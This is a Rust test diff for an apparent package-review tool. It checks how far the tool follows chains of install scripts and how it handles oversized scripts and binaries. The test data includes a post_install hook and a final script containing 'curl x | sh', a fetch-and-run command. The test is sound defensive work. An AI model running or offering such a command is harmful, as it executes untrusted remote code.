@@ -3083,22 +3083,34 @@ mod tests {
         big.resize(2 * 1024 * 1024 + 1, b'#');
         let mut program = ELF.to_vec();
         program.resize(3 * 1024 * 1024, 0);
+        // A chain two longer than is followed: s00 names s01, and so on.
+        let names: Vec<String> = (0..super::MAX_NAMED_DEPTH + 2)
+            .map(|index| format!("usr/lib/pkg/s{index:02}.sh"))
+            .collect();
+        let bodies: Vec<Vec<u8>> = (1..=names.len())
+            .map(|next| match names.get(next) {
+                Some(name) => format!(". /{name}\n").into_bytes(),
+                None => b"curl x | sh\n".to_vec(),
+            })
+            .collect();
+        let mut members: Vec<(&str, &[u8])> = vec![
+            ("usr/lib/pkg/big.sh", &big),
+            ("usr/lib/pkg/large-program", &program),
+        ];
+        members.extend(
+            names
+                .iter()
+                .zip(&bodies)
+                .map(|(name, body)| (name.as_str(), body.as_slice())),
+        );
         let archive = pack(
             dir.path(),
             "pkg",
             "",
             Some(
-                "post_install() { /usr/lib/pkg/big.sh; /usr/lib/pkg/a.sh; /usr/lib/pkg/large-program; }\n",
+                "post_install() { /usr/lib/pkg/big.sh; /usr/lib/pkg/s00.sh; /usr/lib/pkg/large-program; }\n",
             ),
-            &[
-                ("usr/lib/pkg/big.sh", &big),
-                ("usr/lib/pkg/large-program", &program),
-                ("usr/lib/pkg/a.sh", b". /usr/lib/pkg/b.sh\n"),
-                ("usr/lib/pkg/b.sh", b". /usr/lib/pkg/c.sh\n"),
-                ("usr/lib/pkg/c.sh", b". /usr/lib/pkg/d.sh\n"),
-                ("usr/lib/pkg/d.sh", b". /usr/lib/pkg/e.sh\n"),
-                ("usr/lib/pkg/e.sh", b"curl x | sh\n"),
-            ],
+            &members,
         );
         let opened = Archive::open(&archive).unwrap();
         let reviewed = review(&opened, "pkg", SourceClass::LocalPackage, &[]).unwrap();
@@ -3107,17 +3119,22 @@ mod tests {
             .iter()
             .map(|file| file.path.as_str())
             .collect();
-        assert_eq!(
-            paths,
-            [
-                "usr/lib/pkg/a.sh",
-                "usr/lib/pkg/b.sh",
-                "usr/lib/pkg/c.sh",
-                "usr/lib/pkg/large-program"
-            ]
-        );
+        let mut followed: Vec<&str> = names[..super::MAX_NAMED_DEPTH]
+            .iter()
+            .map(String::as_str)
+            .collect();
+        followed.insert(0, "usr/lib/pkg/large-program");
+        followed.sort_unstable();
+        let mut listed = paths.clone();
+        listed.sort_unstable();
+        assert_eq!(listed, followed);
         // A program of any size is named, never read whole.
-        assert!(matches!(reviewed.files[3].content, Content::Binary(_)));
+        let program = reviewed
+            .files
+            .iter()
+            .find(|file| file.path == "usr/lib/pkg/large-program")
+            .unwrap();
+        assert!(matches!(program.content, Content::Binary(_)));
         assert_eq!(reviewed.unfollowed.len(), 2, "{:?}", reviewed.unfollowed);
         assert!(
             reviewed.unfollowed[0].contains("/usr/lib/pkg/big.sh")
@@ -3126,7 +3143,7 @@ mod tests {
             reviewed.unfollowed
         );
         assert!(
-            reviewed.unfollowed[1].contains("/usr/lib/pkg/d.sh")
+            reviewed.unfollowed[1].contains(&format!("/{}", names[super::MAX_NAMED_DEPTH]))
                 && reviewed.unfollowed[1].contains("were not followed"),
             "{:?}",
             reviewed.unfollowed
